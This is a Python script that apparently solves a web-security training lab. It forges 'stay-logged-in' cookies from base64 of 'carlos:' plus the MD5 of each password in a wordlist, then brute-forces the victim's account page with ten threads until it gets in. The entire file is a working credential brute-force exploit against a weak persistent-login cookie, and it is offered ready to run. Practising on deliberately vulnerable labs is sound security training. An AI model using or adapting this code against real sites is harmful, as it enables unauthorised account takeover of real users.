import requests
from colorama import Fore, Style, init
import hashlib
import base64
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.passwords_file = 'passwords.txt'
        self.victim_username = 'carlos'
        self.passwords = []
        self.tokens = []
        self.found = Event()

    @staticmethod
    def hash_string_to_md5(input_string):
        md5_hash = hashlib.md5()
        md5_hash.update(input_string.encode('utf-8'))
        hashed_string = md5_hash.hexdigest()

        return hashed_string

    def open_passwords_file(self):
        with (open(self.passwords_file) as file):
            for password in file.readlines():
                password = password.strip()
                token = base64.b64encode((self.victim_username + ':' + self.hash_string_to_md5(password)).encode()
                                         ).decode()
                self.passwords.append(password)
                self.tokens.append(token)

    def brute_force_carlos_password(self, token, password):
        if self.found.is_set():
            return
        data = {
            'stay-logged-in': token
        }
        response = self.session.get(self.lab_url + 'my-account?id=carlos', cookies=data)
        if self.found.is_set():
            return
        if 'Your username is' in response.text:
            print(Fore.GREEN + '[+] ' + Style.RESET_ALL + password)
            self.found.set()
        else:
            print(Fore.RED + '[-] ' + Style.RESET_ALL + password)

    def brute_force_carlos_passwords(self):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.brute_force_carlos_password, token, password)
                       for token, password in zip(self.tokens, self.passwords)]
            for _ in as_completed(futures):
                if self.found.is_set():
                    break

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.open_passwords_file()
        self.brute_force_carlos_passwords()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
